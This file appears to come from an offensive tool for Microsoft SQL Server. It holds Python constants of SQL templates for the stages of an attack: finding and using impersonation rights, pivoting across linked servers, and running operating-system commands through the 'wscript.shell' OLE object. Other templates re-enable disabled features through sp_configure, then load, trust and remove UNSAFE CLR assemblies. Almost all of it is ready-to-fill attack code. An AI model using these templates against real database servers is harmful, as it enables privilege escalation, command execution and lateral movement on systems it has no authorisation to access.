# Impersonation and authentication queries
CAN_IMPERSONATE_AS = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
IMPERSONATE_AS_USER = "EXECUTE AS LOGIN = '{username}';"
AUTHENTICATE_AS_USER = "EXECUTE AS USER = '{username}';"

# Lateral movement queries
LINKABLE_SERVERS = "EXEC sp_linkedservers;"
OPENQUERY = "SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');"
EXEC_AT = "EXEC ('{query}') AT {linked_server};"
SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
PROCEDURE_EXECUTION = "DECLARE @x AS VARCHAR(100)='{procedure}'; EXEC @x '{command}';"



# General queries
USER_CONTEXT = "SELECT USER_NAME() as username;"
SERVER_HOSTNAME = "SELECT @@SERVERNAME AS [ServerName];"

# Permission checks
IS_UPDATE_SP_CONFIGURE_ALLOWED = "SELECT IIF(IS_SRVROLEMEMBER('sysadmin', SYSTEM_USER) = 1 OR HAS_PERMS_BY_NAME('sp_configure', 'OBJECT', 'ALTER', SYSTEM_USER) = 1, 'True', 'False') AS [CanChangeConfiguration];"
IS_PROCEDURE_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = '{procedure}') = 1 THEN 'True' ELSE 'False' END AS [procedure], CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options') = 1 THEN 'True' ELSE 'False' END AS [show_advanced_options];"
IS_PROCEDURE_EXECUTABLE = "SELECT IIF(HAS_PERMS_BY_NAME('{procedure}', 'OBJECT', 'EXECUTE') = 1, 1, 0) AS [HasPermission];"

# Configuration queries
RECONFIGURE_SHOW_ADVANCED_OPTIONS = "EXEC sp_configure 'show advanced options', {status}; RECONFIGURE;"
RECONFIGURE_PROCEDURE = "EXEC sp_configure '{procedure}', {status}; RECONFIGURE;"

# Custom assemblies queries
IS_CUSTOM_ASM_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled') = 1 THEN 'True' ELSE 'False' END AS [clr_enabled], CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options') = 1 THEN 'True' ELSE 'False' END AS [show_advanced_options], CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr strict security') = 1 THEN 'True' ELSE 'False' END AS [clr_strict_security];"
ADD_CUSTOM_ASM = "CREATE ASSEMBLY {asm_name} FROM {custom_asm} WITH PERMISSION_SET = UNSAFE"
CREATE_PROCEDURE = "CREATE PROCEDURE [dbo].[{procedure_name}] @{arg} NVARCHAR (4000) AS EXTERNAL NAME [{asm_name}].[StoredProcedures].[{procedure_name}];"
IS_MY_APP_TRUSTED = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = {myhash}) THEN 'True' ELSE 'False' END AS [status];"
TRUST_MY_APP = "EXEC sp_add_trusted_assembly @hash = {myhash}, @description = N'Trusted Assembly for My Application';"
UNTRUST_MY_APP = "EXEC sp_drop_trusted_assembly @hash = {myhash};"
CUSTOM_ASM_CLEANUP = "DROP PROCEDURE {procedure_name}; DROP ASSEMBLY {asm_name};"
